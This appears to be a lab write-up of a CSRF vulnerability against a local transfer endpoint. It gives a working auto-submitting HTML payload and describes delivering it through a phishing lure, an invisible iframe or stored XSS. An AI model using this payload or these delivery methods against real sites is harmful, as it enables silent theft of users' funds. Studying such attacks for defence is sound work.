# CSRF Payloads and Exploitation Scenarios

## 1. The Payload
Below is the automated HTML payload used to successfully exploit the CSRF vulnerability and transfer funds without the user's explicit consent. The script waits for the page to load and automatically submits the POST request.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Exploit</title>
</head>
<body>
    <!-- Hidden form targeting the vulnerable transfer endpoint -->
    <form id="csrfForm" action="http://localhost:8080/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
    </form>
    
    <script>
        // Automatically submit the form once the DOM is fully loaded
        window.addEventListener('DOMContentLoaded', () => {
            document.getElementById('csrfForm').submit();
        });
    </script>
</body>
</html>
```

## 2. Exploitation Scenarios

### Scenario 1: Phishing Email Campaign
The attacker crafts a deceptive email pretending to be from a trusted source, such as the application's support team or a promotional offer. The email contains a link, for example: "Click here to claim your $50 bonus!". 
When the victim (who is currently logged into the vulnerable application) clicks the link, they are directed to an external website controlled by the attacker. This website hosts the HTML payload mentioned above. The form is submitted immediately upon opening the page, silently transferring the funds without the victim's knowledge.

### Scenario 2: Compromised Website / Malicious Ad (Drive-by CSRF)
The attacker identifies a website frequently visited by the targeted users (like a community forum) or purchases ad space on a popular site. They embed the payload within an invisible `<iframe>` or inject the malicious HTML directly into a forum post using Stored XSS or HTML injection. 
When an authenticated user simply navigates to the infected page to read a post or view an ad, their browser automatically executes the hidden form submission in the background. The user loses their funds just by browsing the web, without clicking any suspicious links.